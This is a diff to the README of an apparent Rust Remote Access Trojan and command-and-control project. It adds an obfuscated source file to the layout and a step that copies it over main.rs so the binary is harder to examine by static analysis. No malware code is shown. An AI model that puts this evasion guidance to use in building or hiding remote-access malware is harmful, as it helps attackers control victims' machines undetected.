@@ -14,6 +14,9 @@ This project consists of a **Remote Access Trojan (RAT)** and a **Command and Co
 ├── rat
 │   ├── src
 │   │   ├── main.rs   # RAT implementation
+|   |   |
+|   |   ├── obfuscated_main.rs  # Obfuscated source code for the RAT
+|   |   
 │   ├── Cargo.toml    # Rust dependencies
 │
 ├── c2c
@@ -30,6 +33,12 @@ This project consists of a **Remote Access Trojan (RAT)** and a **Command and Co
 
 ### Prerequisites
 - Install [Rust](https://www.rust-lang.org/tools/install)
+
+### Obfuscate the release binary
+You may choose to copy the obfuscated source code into the `main.rs` file to make static analysis even more difficult.
+```bash
+cd rat && cat src/obfuscated_main.rs > main.rs
+```
 
 ### Build the RAT & C2 Server
 ```bash
